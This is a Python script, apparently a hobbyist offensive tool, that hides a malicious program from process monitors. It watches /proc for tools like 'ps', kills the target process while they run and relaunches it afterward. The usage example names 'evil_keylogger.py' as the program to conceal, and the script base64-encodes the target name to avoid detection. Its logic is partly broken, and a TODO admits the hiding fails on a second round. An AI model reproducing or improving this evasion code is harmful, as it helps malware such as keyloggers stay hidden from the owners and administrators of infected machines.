# NOTE: this is overcommented because I'm not the brightest and I will totally forget what everything does
# (improvise adapt overcome)

from ctypes import *
import sys
import os
import ctypes
import signal
import subprocess
import time
import base64

# this will serve us to see whether we should kill a process or revive it, if it's dead we and the process to avoid
# is not being detected, we revive it; if it's alive and the process is being detected, we kill it
is_alive = True

def get_process_name(proc_name):
     try:
          files = os.listdir("/proc/")
          # just iterate over all the processes until we find the one we're looking for
          for f in files:
               if f.isdigit():
                    tmp = "/proc/%s/stat" % f
                    file_o = open(tmp, "rb")
                    for c in file_o:
                         buf = c.split()[1]
                         # we need buf to identify the process to avoid via its name
                         if (buf == "(%s)" % proc_name) or (buf == "(%s" % proc_name) or (buf == "%s" % proc_name):
                              return buf
                              # buf will be returned to warn the user of which program exactly is being detected
                         else:
                              continue
               
     except Exception as e:
          print("[!] Error found! %r" % e)
          sys.exit(0)
          
def kill_process_name(proc_name):
     
     try:
          # Iterate over the processes in /proc/
          files = os.listdir("/proc/")
          for f in files:
               if f.isdigit():
                    tmp = "/proc/%s/stat" % f
                    file_o = open(tmp, "rb")
                    for c in file_o:
                         # Where buf is the name of the process we want to kill and pid is its number
                         buf = c.split()[1]
                         pid = c.split()[0]
                         # We need the name to identify it and the pid to kill it
                         if (buf == "(%s)" % proc_name) or (buf == "(%s" % proc_name) or (buf == "%s" % proc_name):
                              os.kill(int(pid), signal.SIGKILL)
                              print("[+] Process %d:%s neutralized" % (int(pid),buf))
                              return
                    
     except Exception as e:
          print("[!] Can't kill process!: %s" % e)
          
def revive_process(proc_name):
     try:
          subprocess.call([proc_name])
          return
          # TODO: fails to hide on the second round
     except Exception as e:
          print("[!] Error spawning process: %s" % e)
          sys.exit(0)

if __name__ == "__main__":
     # buf is where the process to avoid will be stored
     buf = ""
     
     if len(sys.argv) < 3:
          print("[!] Usage: python file-descriptor.py [program(s) you want to hide from] [your program name]")
          print("[*] Example: python file-descriptor.py ps evil_keylogger.py")
          #TODO print("[*] Example: python file-descriptor.py ps,top evil_keylogger.py")          
          print
          print("Made with <3 by BobTheDog")
          sys.exit(0)
          
     # base64 decode sys.argv[1] to avoid being detected as the script name
     proc_name = sys.argv[1]
     kill_proc_name = sys.argv[2]
     try:
          kill_proc_name = base64.b64decode(kill_proc_name)
     except Exception as e:
          print("Maybe try base64 encoding the process name? Error: %s" % e)
          print
          print("Made with <3 by BobTheDog")
          sys.exit(0)             
          
     while True:
          try:
               buf = get_process_name(proc_name)
               # When get_process_name detects the program we want to avoid (buf wont be None)
               if (buf != None):
                    if (is_alive == True):
                         print("[!] %s has been detected!" % proc_name)
                         kill_process_name(kill_proc_name)
                         print("[!] Stopping %s for now" % kill_proc_name)
                         # switch it fo false to indicate that our program is not not alive
                         is_alive = False
                         
                    if (is_alive == False):
                         # Sleep a bit before restarting so it won't be detected if f.i "ps" is run consecutively
                         time.sleep(2)                         
                         print("[+] Reviving the program %s..." % kill_proc_name)
                         revive_process(kill_proc_name)
                         print("[+] Success!")
                         # switch it to true to indicate that our program is now being run again
                         is_alive = True                         
                         
               if (buf == None):
                    # buf is none because the process is not being detected
                    continue
               
          except KeyboardInterrupt as e:
               print("[!] CTRL+C you did")
               print("[!] Exit we shall")
               print
               print("Made with <3 by BobTheDog")
               sys.exit(0)
     
     print
     print("Made with <3 by BobTheDog")